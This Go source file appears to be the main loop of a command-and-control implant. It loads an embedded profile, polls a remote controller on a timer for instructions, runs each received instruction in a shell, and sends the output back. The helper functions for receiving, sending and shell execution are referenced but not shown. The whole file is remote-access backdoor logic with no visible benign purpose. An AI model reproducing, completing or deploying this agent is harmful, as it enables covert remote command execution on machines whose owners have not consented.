package main

import (
	"common/profiles"
	"fmt"
	"time"
)

// handleErr handles errors of the main function only.
// It handles unrecoverable errors and for most cases you don't
// need to use this function.
func handleErr(err error) {
	if err == nil {
		return
	}
	panic(err)
}

func main() {
	profile, err := profiles.Load(rawProfile)
	handleErr(err)

	for range time.Tick(profile.GetTickAmount()) {
		instruction, err := receive(&profile)
		if err != nil {
			fmt.Println("receive error:", err)
			continue
		}

		if len(instruction) == 0 {
			fmt.Println("empty instruction, skipping...")
			continue
		}

		output, err := shell(instruction)
		if err != nil {
			if len(output) == 0 {
				output = err.Error()
			} else {
				output += "\n" + err.Error()
			}
		}

		if err := send(&profile, &output); err != nil {
			fmt.Println("send error:", err)
			continue
		}
	}
}
